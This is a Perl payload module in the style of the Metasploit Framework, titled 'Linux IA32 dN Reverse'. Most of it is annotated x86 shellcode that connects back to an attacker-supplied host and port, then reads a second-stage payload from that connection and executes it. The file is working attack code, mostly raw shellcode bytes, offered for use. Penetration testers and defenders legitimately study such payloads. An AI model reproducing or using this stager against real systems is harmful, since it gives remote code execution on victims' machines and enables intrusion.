package Msf::Payload::linux_ia32_dN_reverse;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
  'Name'         => 'Linux IA32 dN Reverse',
  'Version'      => '0.1',
  'Description'  => 'Aegis server to connect back',
  'Authors'      => [ 'Your mom', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LPORT'), $self->GetVar('LHOST')));
}

sub Generate {
  my $self = shift;
  my $port = shift;
  my $host = shift;
  my $off_port = 26;
  my $port_bin = pack('n', $port);
  my $off_host = 19;
  my $host_bin = gethostbyname($host);
  
  my $shellcode =
    "\x31\xC0".       # xor eax,eax
    "\x89\xC3".       # mov ebx,eax
    "\x43".           # inc ebx
    "\x50".           # push eax
    "\x53".           # push ebx
    "\x43".           # inc ebx
    "\x53".           # push ebx
    "\x89\xE1".       # mov ecx,esp
    "\xB0\x66".       # mov al,0x66
    "\x4B".           # dec ebx
    "\xCD\x80".       # int 0x80
    "\x89\xC7".       # mov edi,eax
    "\x68\x7F\x00\x00\x01".# push dword 0x100007f
    "\x68\x02\x00\x22\x11".# push dword 0x11220002
    "\x89\xE1".       # mov ecx,esp
    "\x6A\x10".       # push byte +0x10
    "\x51".           # push ecx
    "\x50".           # push eax
    "\x89\xE1".       # mov ecx,esp
    "\x50".           # push eax
    "\x31\xC0".       # xor eax,eax
    "\xB0\x66".       # mov al,0x66
    "\xB3\x03".       # mov bl,0x3
    "\xCD\x80".       # int 0x80
    "\xEB\x03".       # jmp short 0x32
    "\x5E".           # pop esi
    "\xEB\x32".       # jmp short 0x64
    "\xE8\xF8\xFF\xFF\xFF".# call 0x2f
    "\x31\xC0".       # xor eax,eax
    "\xB0\x04".       # mov al,0x4
    "\xEB\x04".       # jmp short 0x41
    "\x31\xC0".       # xor eax,eax
    "\xB0\x03".       # mov al,0x3
    "\x5B".           # pop ebx
    "\x5B".           # pop ebx
    "\x59".           # pop ecx
    "\x5A".           # pop edx
    "\x8D\x64\x24\xF0".# lea esp,[esp-0x10]
    "\x56".           # push esi
    "\x89\xC6".       # mov esi,eax
    "\xCD\x80".       # int 0x80
    "\x53".           # push ebx
    "\x31\xDB".       # xor ebx,ebx
    "\x39\xD8".       # cmp eax,ebx
    "\x5B".           # pop ebx
    "\x7C\x0C".       # jl 0x62
    "\x39\xD0".       # cmp eax,edx
    "\x7D\x08".       # jnl 0x62
    "\x01\xC1".       # add ecx,eax
    "\x29\xC2".       # sub edx,eax
    "\x89\xF0".       # mov eax,esi
    "\xEB\xEA".       # jmp short 0x4c
    "\x5E".           # pop esi
    "\xC3".           # ret
    "\x89\xE5".       # mov ebp,esp
    "\x68\x41\x41\x41\x41".# push dword 0x41414141
    "\x31\xDB".       # xor ebx,ebx
    "\xB3\x04".       # mov bl,0x4
    "\x89\xE0".       # mov eax,esp
    "\x53".           # push ebx
    "\x50".           # push eax
    "\x57".           # push edi
    "\xE8\xBE\xFF\xFF\xFF".# call 0x37
    "\x89\xE0".       # mov eax,esp
    "\x31\xDB".       # xor ebx,ebx
    "\xB3\x04".       # mov bl,0x4
    "\x53".           # push ebx
    "\x50".           # push eax
    "\x57".           # push edi
    "\xE8\xB6\xFF\xFF\xFF".# call 0x3d
    "\x58".           # pop eax
    "\x58".           # pop eax
    "\x58".           # pop eax
    "\x58".           # pop eax
    "\x29\xC4".       # sub esp,eax
    "\x89\xE3".       # mov ebx,esp
    "\x50".           # push eax
    "\x53".           # push ebx
    "\x57".           # push edi
    "\xE8\xA6\xFF\xFF\xFF".# call 0x3d
    "\x58".           # pop eax
    "\x58".           # pop eax
    "\x58".           # pop eax
    "\x89\xE0".       # mov eax,esp
    "\x89\xF3".       # mov ebx,esi
    "\x53".           # push ebx
    "\x83\xEB\xFA".   # sub ebx,byte -0x6
    "\x53".           # push ebx
    "\x57".           # push edi
    "\xFF\xD0".       # call eax
    "\x89\xEC".       # mov esp,ebp
    "\xEB\xBA";       # jmp short 0x64
  
  substr($shellcode, $off_port, 2, $port_bin);
  substr($shellcode, $off_host, 4, $host_bin);
  return($shellcode);   
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444', '127.0.0.1');
  return(length($bin));
}

1;
